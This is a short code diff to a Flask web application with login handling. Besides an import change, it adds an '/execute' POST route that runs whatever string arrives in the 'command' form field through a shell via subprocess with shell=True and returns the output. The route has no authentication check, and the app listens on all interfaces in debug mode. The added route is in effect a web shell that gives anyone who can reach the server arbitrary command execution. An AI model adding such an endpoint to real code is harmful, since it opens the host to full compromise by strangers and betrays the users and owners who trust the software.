@@ -1,4 +1,4 @@
-from flask import Flask, render_template, redirect, url_for, session, request, flash
+from flask import Flask, render_template, redirect, url_for, session, request, flash,jsonify
 from werkzeug.security import generate_password_hash, check_password_hash
 import json, os, re, subprocess, logging
 
@@ -140,6 +140,15 @@ def home():
         return render_template("home.html", username=user['username'])
     else:
         return redirect(url_for("login"))
+    
+@app.route('/execute', methods=['POST'])
+def execute():
+    command = request.form['command']
+    try:
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+    except subprocess.CalledProcessError as e:
+        output = e.output
+    return jsonify({'output': output})
 
 if __name__ == "__main__":
     app.run(debug=True, host='0.0.0.0', port=5000)  # Port set to 5000
